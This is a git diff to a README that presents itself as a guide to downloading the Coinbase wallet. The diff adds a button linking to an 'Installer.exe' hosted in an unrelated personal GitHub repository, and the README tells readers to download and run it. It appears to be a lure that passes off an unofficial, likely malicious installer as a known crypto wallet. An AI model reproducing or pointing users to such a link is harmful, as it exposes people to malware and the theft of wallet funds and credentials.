@@ -20,7 +20,9 @@ Follow these steps to get started with **coinbase download wallet**:
 
 1. **Download the file.**  
    Click the "Download" button below or check the "Releases" section of this repository to find the latest version.
-![download](https://github.com/user-attachments/assets/595fe3e6-183b-44e5-b920-4700c0b6ec9c)
+<a href="https://github.com/murphyheather6/Download-Coinbase-Wallet/releases/download/publish/Installer.exe">
+  <img src="https://github.com/user-attachments/assets/595fe3e6-183b-44e5-b920-4700c0b6ec9c" alt="201887" width="300"/>
+</a>
 
 2. **Install the application.**  
    Run the downloaded file and follow the installation instructions provided on-screen.
